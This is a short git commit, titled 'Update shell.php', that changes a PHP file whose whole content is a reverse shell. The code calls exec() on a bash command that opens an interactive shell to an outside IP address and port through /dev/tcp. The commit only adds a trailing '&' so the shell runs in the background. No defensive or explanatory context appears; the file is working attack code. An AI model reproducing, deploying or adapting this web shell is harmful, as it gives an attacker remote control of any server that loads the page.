a49a61c16d4c85d86a902e4ca6326f1d7e3b2db2
Christo Gouws <gouws.christo@gmail.com>
2022-07-25 20:37:46 +0200

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,7 +1,7 @@
 <?php
   $output=null;
   $retval=null;
-  $cmd = '/bin/bash -c "/bin/bash -i >& /dev/tcp/165.232.38.202/31373 0>&1"';
+  $cmd = '/bin/bash -c "/bin/bash -i >& /dev/tcp/165.232.38.202/31373 0>&1 &"';
   exec($cmd, $output, $retval);
   echo "Returned with status $retval and output:\n";
   print_r($output);
